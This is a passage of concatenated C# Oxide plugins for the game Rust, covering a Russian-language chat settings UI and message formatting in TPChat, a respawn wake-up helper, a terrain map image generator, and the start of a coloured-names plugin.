t = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = leftActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2" }
            }, guid + ".L");
            
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 1", OffsetMin = "-30 0", OffsetMax = "0 0" },
                Image = { Color = rightActive ? "0.81 0.77 0.74 0.2" : "0.81 0.77 0.74 0.1"}
            }, guid + ".P", guid + ".WINDOW");
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = rightActive ? rightCommand : "" },
                Text = { Text = "<b>></b>", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
            }, guid + ".WINDOW");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = currentStatus.Value.Split(':')[0], Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
            }, guid + ".P");

            #endregion 

            #region Switch layer Размер префикса
            
            
            currentStatus = Settingses.Sizes.FirstOrDefault(p => p.Value.Split(':')[1] == settings.Prefixes.Size);
            possibleStatuses = Settingses.Sizes.ToList().FindAll(p => permission.UserHasPermission(player.UserIDString, p.Key));
 
            colorIndex = possibleStatuses.IndexOf(currentStatus);
            leftCommand = $"UI_Chat prefix_size {possibleStatuses.ElementAtOrDefault(colorIndex - 1).Value}"; 
            rightCommand = $"UI_Chat prefix_size {possibleStatuses.ElementAtOrDefault(colorIndex + 1).Value}"; 
            leftActive = colorIndex > 0 && canChange;
            rightActive = colorIndex < possibleStatuses.Count - 1 && canChange;
            
            guid = CuiHelper.GetGuid(); 
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = $"250 -500", OffsetMax = $"974 -323"},
                Text = { Text = $"РАЗМЕР ПРЕФИКСА<size=12>({possibleStatuses.Count})</size>", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = "5, 225, 250"}
            }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
            {
                RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                Image = {Color = "0.27 0.247 0.184 1"}
            }, guid, guid + ".P");
            
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 1", OffsetMax = "30 0" },
                Image = { Color = leftActive ? "0.81 0.77 0.74 0.2" : "0.81 0.77 0.74 0.15" }
            }, guid + ".P", guid + ".L"); 
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = leftActive ? leftCommand : "" },
                Text = { Text = "<b><</b>", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = leftActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2" }
            }, guid + ".L");
            
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 1", OffsetMin = "-30 0", OffsetMax = "0 0" },
                Image = { Color = rightActive ? "0.81 0.77 0.74 0.2" : "0.81 0.77 0.74 0.1"}
            }, guid + ".P", guid + ".WINDOW");
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = rightActive ? rightCommand : "" },
                Text = { Text = "<b>></b>", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
            }, guid + ".WINDOW");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = currentStatus.Value.Split(':')[0], Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
            }, guid + ".P");

            #endregion 

            #region Switch layer Вид префикса
            
            
            currentStatus = Settingses.Types.FirstOrDefault(p => p.Value.Split(':')[1] == settings.Prefixes.Hooks);
            possibleStatuses = Settingses.Types.ToList().FindAll(p => permission.UserHasPermission(player.UserIDString, p.Key));
 
            colorIndex = possibleStatuses.IndexOf(currentStatus);
            leftCommand = $"UI_Chat hook_type {possibleStatuses.ElementAtOrDefault(colorIndex - 1).Value}"; 
            rightCommand = $"UI_Chat hook_type {possibleStatuses.ElementAtOrDefault(colorIndex + 1).Value}"; 
            leftActive = colorIndex > 0 && canChange;
            rightActive = colorIndex < possibleStatuses.Count - 1 && canChange;
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -390", OffsetMax = $"-200 -356" },
                Text = { Text = $"ВИД ПРЕФИКСА<size=12>({possibleStatuses.Count})</size>", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 22, Color = "5, 255, 250"}
            }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
            {
                RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                Image = {Color = "0.27 0.247 0.184 1"}
            }, guid, guid + ".P");
            
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 1", OffsetMax = "30 0" },
                Image = { Color = leftActive ? "0.81 0.77 0.74 0.2" : "0.81 0.77 0.74 0.15" }
            }, guid + ".P", guid + ".L"); 
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = leftActive ? leftCommand : "" },
                Text = { Text = "<b><</b>", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = leftActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2" }
            }, guid + ".L");
            
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 1", OffsetMin = "-30 0", OffsetMax = "0 0" },
                Image = { Color = rightActive ? "0.81 0.77 0.74 0.2" : "0.81 0.77 0.74 0.1"}
            }, guid + ".P", guid + ".WINDOW");
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = rightActive ? rightCommand : "" },
                Text = { Text = "<b>></b>", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
            }, guid + ".WINDOW");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = currentStatus.Value.Split(':')[0], Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
            }, guid + ".P");

            #endregion 
             
            

            #region Bool layer Подсказки
            
             
            var switchStatus = settings.Chatters.Tips;

            var mainCommand = $"UI_Chat tips {!switchStatus}"; 
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -590", OffsetMax = $"-200 -388" },
                Text = { Text = "ПОДСКАЗКИ", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = "5, 225, 250"}
            }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
            {
                RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                Image = {Color = switchStatus ? "0.27 0.247 0.184 1" : "0.23 0.22 0.17 0.5"}
            }, guid, guid + ".P");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = switchStatus ? "ВКЛ" : "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
            }, guid + ".P");
            
            container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = mainCommand },
                    Text = { Text = "", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
                }, guid + ".P"); 

            #endregion 
            
            #region Bool layer Звуки
            
             
            switchStatus = settings.Chatters.Sound;

            mainCommand = $"UI_Chat sound {!switchStatus}";  
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -600", OffsetMax = $"-200 -421" },
                    Text = { Text = "ЗВУК ЛИЧНЫХ СООБЩ.", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = "5, 225, 250"}
                }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
                {
                    RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                    Image = {Color = switchStatus ? "0.27 0.247 0.184 1" : "0.23 0.22 0.17 0.5"}
                }, guid, guid + ".P");
            
            container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                    Text = { Text = switchStatus ? "ВКЛ" : "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
                }, guid + ".P");
            
            container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = mainCommand },
                    Text = { Text = "", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
                }, guid + ".P"); 

            #endregion 
            
            
            #region Bool layer Вид префикса
            
             
            switchStatus = settings.Chatters.Censor;

            mainCommand = $"UI_Chat censor {!switchStatus}";  
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -700", OffsetMax = $"-200 -453" },
                    Text = { Text = "ЦЕНЗУРА", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = "5, 225, 250"}
                }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
                {
                    RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                    Image = {Color = switchStatus ? "0.27 0.247 0.184 1" : "0.23 0.22 0.17 0.5"}
                }, guid, guid + ".P");
            
            container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                    Text = { Text = switchStatus ? "ВКЛ" : "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
                }, guid + ".P");
            
            container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = mainCommand },
                    Text = { Text = "", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
                }, guid + ".P"); 

            #endregion 
            
            #region Bool layer Вид префикса
            
             
            switchStatus = settings.Chatters.Chat;

            mainCommand = $"UI_Chat chatglobal {!switchStatus}";  
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -700", OffsetMax = $"-200 -486" },
                Text = { Text = "ГЛОБАЛЬНЫЙ ЧАТ", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = ""}
            }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
            {
                RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                Image = {Color = switchStatus ? "0.27 0.247 0.184 1" : "0.23 0.22 0.17 0.5"}
            }, guid, guid + ".P");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = switchStatus ? "ВКЛ" : "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "250, 5, 5"}
            }, guid + ".P");
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = mainCommand },
                Text = { Text = "", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
            }, guid + ".P"); 

            #endregion 
            
            #region Bool layer Вид префикса
            
             
            switchStatus = settings.Chatters.PM;

            mainCommand = $"UI_Chat chatpm {!switchStatus}";  
            
            guid = CuiHelper.GetGuid(); 
             
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "1 1", OffsetMin = $"250 -700", OffsetMax = $"-200 -520" },
                Text = { Text = "ЛИЧНЫЕ СООБЩЕНИЯ", Align = TextAnchor.UpperLeft, Font = "robotocondensed-bold.ttf", FontSize = 25, Color = "5, 225, 250"}
            }, SettingsLayer + ".INNER", guid);

            container.Add(new CuiPanel
            {
                RectTransform = {AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = $"-250 -30", OffsetMax = $"-30 0"},
                Image = {Color = switchStatus ? "0.27 0.247 0.184 1" : "0.23 0.22 0.17 0.5"}
            }, guid, guid + ".P");
            
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = $"30 0", OffsetMax = $"-30 0" },  
                Text = { Text = switchStatus ? "ВКЛ" : "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 18, Color = "0.81 0.77 0.74 0.6"}
            }, guid + ".P");
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = mainCommand },
                Text = { Text = "", Font = "robotocondensed-bold.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = rightActive ? "0.8 0.8 0.8 1" : "0.8 0.8 0.8 0.2"}
            }, guid + ".P"); 

            #endregion 
			
			container.Add(new CuiButton 
			{
				RectTransform = { AnchorMin = "0.8 0.804", AnchorMax = "0.817 0.832" },
				Button = { Color = "0.929 0.882 0.847 0",  Close = "Menu_UI" }, 
				Text = { Text = "" }
			}, SettingsLayer + ".WINDOW");
			
            CuiHelper.AddUi(player, container);	
        }
 
        #endregion

        #region Utils

        private void LogChat(string message) => LogToFile("Chat", "[" + DateTime.Now.ToShortTimeString() + "]" + message, this);
        private void LogPM(string message) => LogToFile("PM", "[" + DateTime.Now.ToShortTimeString() + "]" + message, this);

        
        
        private string PrepareNickForConnect(BasePlayer player)
        {
            var settings = Handler.Settingses[player.userID];

            string prefixPrepare = "continue";
            switch (settings.Prefixes.Hooks) 
            {
                case "[]": prefixPrepare = $"[{settings.Prefixes.Color}{settings.Prefixes.Name}</color>]";
                    break;
                case "-": prefixPrepare = $"{settings.Prefixes.Color}{settings.Prefixes.Name}</color>";
                    break;
                case "|": prefixPrepare = $"{settings.Prefixes.Color}{settings.Prefixes.Name}</color> |";
                    break;
            }

            if (settings.Prefixes.Name == "-")
                prefixPrepare = "";
            
            string format = "continue";
            switch (settings.Prefixes.Hooks)
            {
                case "[]": format = $"{(Settingses.WelcomePrefix ? prefixPrepare : "")} {settings.Names.Color}{player.displayName}</color>";
                    break;
                case "-": format = $"{(Settingses.WelcomePrefix ? prefixPrepare : "")} {settings.Names.Color}{player.displayName}</color>";
                    break;
                case "|": format = $"{(Settingses.WelcomePrefix ? prefixPrepare : "")} {settings.Names.Color}{player.displayName}</color>";
                    break;
            }
            
            return format; 
        }

        private string PrepareNick(BasePlayer player)
        {
            var settings = Handler.Settingses[player.userID];

            string prefixPrepare = "continue";
            switch (settings.Prefixes.Hooks) 
            {
                case "[]": prefixPrepare = $"[{settings.Prefixes.Color}{settings.Prefixes.Name}</color>]";
                    break;
                case "-": prefixPrepare = $"{settings.Prefixes.Color}{settings.Prefixes.Name}</color>";
                    break;
                case "|": prefixPrepare = $"{settings.Prefixes.Color}{settings.Prefixes.Name}</color> |";
                    break;
            }

            if (settings.Prefixes.Name == "-")
                prefixPrepare = "";

            string name = player.displayName.Length > 26 ? player.displayName.Substring(0, 26) : player.displayName;

            string format = "continue";
            switch (settings.Prefixes.Hooks)
            {
                case "[]": format = $"{prefixPrepare} {settings.Names.Color}{name}</color>";
                    break;
                case "-": format = $"{prefixPrepare} {settings.Names.Color}{name}</color>";
                    break;
                case "|": format = $"{prefixPrepare} {settings.Names.Color}{name}</color>";
                    break;
            }
            
            return format; 
        }

        private string Censure(string message)
        {
            foreach (var mat in Settingses.Censures)
            {
                if (message.ToLower().Contains(mat.Key))
                {
                    bool shouldReplace = true;
                    foreach (var ist in mat.Value)
                    {
                        if (message.Contains(ist))
                        {
                            shouldReplace = false;
                            break;
                        }
                    }

                    if (shouldReplace) message = message.Replace(mat.Key, "***", StringComparison.CurrentCultureIgnoreCase);
                }
            }

            return message; 
        }
        
        private string PrepareMessage(BasePlayer player, string message, bool team = false) 
        {
            var settings = Handler.Settingses[player.userID];

            string prefixPrepare = "continue";
            switch (settings.Prefixes.Hooks)
            {
                case "[]": prefixPrepare = $"{settings.Prefixes.Size}[{settings.Prefixes.Color}{settings.Prefixes.Name}</color>]</size>";
                    break;
                case "-": prefixPrepare = $"{settings.Prefixes.Size}{settings.Prefixes.Color}{settings.Prefixes.Name}</color></size>";
                    break;
                case "|": prefixPrepare = $"{settings.Prefixes.Size}{settings.Prefixes.Color}{settings.Prefixes.Name}</color></size> |";
                    break;
            }

            if (settings.Prefixes.Name == "-")
                prefixPrepare = "";
            
            string format = "continue";
            switch (settings.Prefixes.Hooks)
            {
                case "[]": format = $"{prefixPrepare} {settings.Names.Color}{player.displayName}</color>: {message}";
                    break;
                case "-": format = $"{prefixPrepare} {settings.Names.Color}{player.displayName}</color>: {message}";
                    break;
                case "|": format = $"{prefixPrepare} {settings.Names.Color}{player.displayName}</color>: {message}";
                    break;
            }

            if (team) format = "<color=#ADFF2F>[TEAM]</color> " + format;
            
            return format;
        }

        #endregion
    }
}

// --- End of file: TPChat.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/WakeUp.cs ---
// --- Original Local Path: WakeUp.cs ---

using System;

namespace Oxide.Plugins
{
    [Info("WakeUp", "Virobeast", "0.0.3", ResourceId = 1487)]
    [Description("Removes Your sleeping screen after hitting respawn")]

    class WakeUp : RustPlugin
    {

        #region no sleeper

        void OnPlayerRespawned(BasePlayer player)
        {
            timer.Once(3, () =>
            {
                if (player.IsSleeping()) player.EndSleeping();
            });
        }
        #endregion
    }
}


// --- End of file: WakeUp.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/MapGenerator (1).cs ---
// --- Original Local Path: MapGenerator (1).cs ---

using System.IO;
using Oxide.Core;
using UnityEngine;
using System;
using Newtonsoft.Json;

namespace Oxide.Plugins
{
    [Info("MapGenerator", "Dids/SkiTles", "0.1")]
    [Description("Simple map generator")]
    class MapGenerator : RustPlugin
    {
        //Original code - SeederyIoMapGen by Pauli 'Dids' Jokela
        //url - https://github.com/Dids/seedery.io-mapgen

        //Данный плагин (модификация SeederyIoMapGen) принадлежит группе vk.com/vkbotrust
        //Данный плагин предоставляется в существующей форме,
        //"как есть", без каких бы то ни было явных или
        //подразумеваемых гарантий, разработчик не несет
        //ответственность в случае его неправильного использования.

        #region Config
        private static ConfigFile config;
        private class ConfigFile
        {
            [JsonProperty(PropertyName = "Имя генерируемого файла карты, без расширения (.jpg), если папки указаной в имени не существует, плагин будет выдавать ошибку")]
            public string filename { get; set; }

            [JsonProperty(PropertyName = "Автоматическая генерация новой карты после вайпа")]
            public bool AutoMap { get; set; }

            [JsonProperty(PropertyName = "Размер изображения для автоматической генерации карты (0 - размер по дефолту)")]
            public int autosize { get; set; }

            [JsonProperty(PropertyName = "Расширение файла (автоматическая генерация, jpg или png)")]
            public string type { get; set; }

            public static ConfigFile DefaultConfig()
            {
                return new ConfigFile
                {
                    filename = "map",
                    AutoMap = false,
                    autosize = 0,
                    type = "jpg"
                };
            }
        }
        protected override void LoadDefaultConfig()
        {
            config = ConfigFile.DefaultConfig();
            PrintWarning("Создан новый файл конфигурации. Поддержи разработчика! Вступи в группу vk.com/vkbotrust");
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<ConfigFile>();
                if (config == null)
                    Regenerate();
            }
            catch { Regenerate(); }
        }
        protected override void SaveConfig() => Config.WriteObject(config);
        private void Regenerate()
        {
            PrintWarning($"Конфигурационный файл 'oxide/config/{Name}.json' поврежден, создается новый...");
            LoadDefaultConfig();
        }
        #endregion

        #region Properties
        private int _mapWidth;
        private int _mapHeight;
        private Terrain _terrain;
        private bool NewWipe = false;
        #endregion

        #region Commands
        [ConsoleCommand("savemap")]
        private void SaveMapCMD(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            int size = 0;
            string filetype = ".jpg";
            if (arg.HasArgs())
            {
                if (!Int32.TryParse(arg.Args[0], out size)) PrintWarning("Неправильно указан размер изображения. При генерации будет установлено дефолтное значение (размер карты / 2)");
                if (arg.Args.Length > 1 && arg.Args[1] == "png") filetype = ".png";
            }
            GenerateMap(size, filetype);
        }
        #endregion

        #region MapGenerator
        private void GenerateMap(int size = 0, string filetype = ".jpg")
        {
            PrintWarning("Создается изображение карты. Сервер может подвиснуть на 5- 10 секунд!");
            TerrainMeta.HeightMap.GenerateTextures();
            Texture2D rawmap = TerrainMeta.HeightMap.NormalTexture;
            int width = TerrainMeta.Terrain.terrainData.heightmapWidth - 1;
            int height = TerrainMeta.Terrain.terrainData.heightmapHeight - 1;
            Texture2D finalTexture = new Texture2D(width, height);
            _terrain = TerrainMeta.Terrain;
            Color waterColor = Color.white;
            float lowestTerrainheight = GetLowestTerrainHeight();
            float highestTerrainHeight = GetHighestTerrainHeight();
            for (int y = 0; y < finalTexture.height; y++)
            {
                for (int x = 0; x < finalTexture.width; x++)
                {
                    bool water = false;
                    int mask = -1;
                    float terrainStartX = TerrainMeta.Terrain.GetPosition().x;
                    float terrainStartY = TerrainMeta.Terrain.GetPosition().z;
                    float terrainSizeX = TerrainMeta.Size.x;
                    float terrainSizeY = TerrainMeta.Size.z;
                    float terrainScaleUpX = TerrainMeta.Size.x / width;
                    float terrainScaleUpY = TerrainMeta.Size.z / height;
                    float terrainScaleDownX = width / TerrainMeta.Size.x;
                    float terrainScaleDownY = height / TerrainMeta.Size.z;
                    float startX = x * terrainScaleUpX;
                    float startY = y * terrainScaleUpY;
                    float calculatedTerrainX = startX + terrainStartX;
                    float calculatedTerrainY = startY + terrainStartY;
                    Vector3 terrainWorldPosition = new Vector3(calculatedTerrainX, 0, calculatedTerrainY);
                    float waterDepth = TerrainMeta.WaterMap.GetDepth(terrainWorldPosition);
                    float terrainHeight = _terrain.terrainData.GetHeight(x, y) - lowestTerrainheight;
                    float currentHeight = terrainHeight / (highestTerrainHeight - lowestTerrainheight);
                    if (currentHeight > waterDepth)
                    {
                        Color pixelColor = TerrainMeta.Colors.GetColor(terrainWorldPosition, mask);
                        pixelColor.a = TerrainMeta.AlphaMap.GetAlpha(x, y);
                        finalTexture.SetPixel(x, y, pixelColor);
                    }
                    else
                    {
                        Color blueColor = new Color(0f, (1f / 255f) * 150f, 1f, 1f);
                        finalTexture.SetPixel(x, y, blueColor);
                        water = true;
                    }
                    if (rawmap != null)
                    {
                        var finalTextureColor = finalTexture.GetPixel(x, y);
                        var heightmapNormalTextureColor = rawmap.GetPixel(x, y);
                        var alphaBlendedColor = AlphaBlend(heightmapNormalTextureColor, finalTextureColor);
                        finalTexture.SetPixel(x, y, alphaBlendedColor);
                        if (x == 0 && y == 0 && water)
                            waterColor = alphaBlendedColor;
                        else
                        {
                            if (water)
                            {
                                if (waterDepth > 4 && waterColor != Color.white) finalTexture.SetPixel(x, y, waterColor);
                                if (waterDepth <= 4 && waterColor != Color.white)
                                {
                                    var waterColor2 = new Color(waterColor.r, waterColor.g, waterColor.b, (waterDepth / 255f) * 63f);
                                    var alphaBlendedColor2 = AlphaBlend(waterColor2, finalTextureColor);
                                    finalTexture.SetPixel(x, y, alphaBlendedColor2);
                                }
                            }
                        }
                    }
                }
            }
            finalTexture.Apply();
            SaveIMG(finalTexture, size, filetype);
            UnityEngine.Object.Destroy(finalTexture);
        }

        private float GetLowestTerrainHeight()
        {
            float lowestHeight = TerrainMeta.Size.y;
            for (var x = 0; x < TerrainMeta.Size.x; x++)
            {
                for (var y = 0; y < TerrainMeta.Size.z; y++)
                {
                    var h = _terrain.terrainData.GetHeight(x, y);
                    if (h < lowestHeight) lowestHeight = h;
                }
            }
            return lowestHeight;
        }

        private float GetHighestTerrainHeight()
        {
            float highestHeight = 0;
            for (var x = 0; x < TerrainMeta.Size.x; x++)
            {
                for (var y = 0; y < TerrainMeta.Size.z; y++)
                {
                    var h = _terrain.terrainData.GetHeight(x, y);
                    if (h > highestHeight) highestHeight = h;
                }
            }
            return highestHeight;
        }

        private static Color AlphaBlend(Color top, Color bottom)
        {
            return new Color(BlendSubpixel(top.r, bottom.r, top.a, bottom.a),
                             BlendSubpixel(top.g, bottom.g, top.a, bottom.a),
                             BlendSubpixel(top.b, bottom.b, top.a, bottom.a),
                             top.a + bottom.a);
        }

        private static float BlendSubpixel(float top, float bottom, float alphaTop, float alphaBottom)
        {
            return (top * alphaTop) + ((bottom - 1f) * (alphaBottom - alphaTop));
        }

        private void SaveIMG(Texture2D texture, int size = 0, string filetype =".jpg")
        {
            if (filetype != ".jpg" && filetype != ".png") return;
            byte[] bytes = null;
            if (filetype == ".jpg") bytes = texture.EncodeToJPG();
            if (filetype == ".png") bytes = texture.EncodeToPNG();
            if (bytes == null) return;    
            Stream stream = new MemoryStream(bytes);
            System.Drawing.Image mapimage = System.Drawing.Image.FromStream(stream);
            if (size != 0 && size != mapimage.Height)
            {
                System.Drawing.Image.GetThumbnailImageAbort myCallback = new System.Drawing.Image.GetThumbnailImageAbort(ThumbnailCallback);
                mapimage = mapimage.GetThumbnailImage(size, size, myCallback, IntPtr.Zero);
            }
            if (filetype == ".jpg") mapimage.Save(Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + config.filename + filetype, System.Drawing.Imaging.ImageFormat.Jpeg);
            if (filetype == ".png") mapimage.Save(Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + config.filename + filetype, System.Drawing.Imaging.ImageFormat.Png);
            PrintWarning($"Изображение карты размером {mapimage.Height}px сохранено: {Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + config.filename + filetype}");
        }

        public bool ThumbnailCallback()
        {
            return false;
        }
        #endregion

        #region OxideHooks
        void OnNewSave(string filename)
        {
            if (config.AutoMap) NewWipe = true;
        }
        void OnServerInitialized()
        {
            if (config.AutoMap && NewWipe) GenerateMap(config.autosize, config.type);
        }
        #endregion
    }
}

// --- End of file: MapGenerator (1).cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/ColouredNames.cs ---
// --- Original Local Path: ColouredNames.cs ---

using System.Collections.Generic;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("ColouredNames", "PsychoTea", "1.0.0")]
    internal class ColouredNames : RustPlugin
    {
        class StoredData
        {
            public Dictionary<ulong, string> colour = new Dictionary<ulong, string>();
        }
        StoredData storedData;

        void Init() => permission.RegisterPermission("colourednames.colouredName", this);

        void Loaded() => storedData = Interface.GetMod().DataFileSystem.ReadObject<StoredData>("ColouredNames");

        object OnPlayerChat(ConsoleSystem.Arg arg)
        {
            BasePlayer player = (BasePlayer)arg.connection.player;

            if (storedData.colour.ContainsKey(player.userID))
            {
                if (storedData.colour[player.userID] == "clear") return null;
                //ConsoleSystem.Broadcast("chat.add", player.userID.ToString(), string.Format("<color=" + storedData.colour[player.userID] + ">" + player.displayName + "</color>: " + arg.GetString(0, "text")), 1.0);
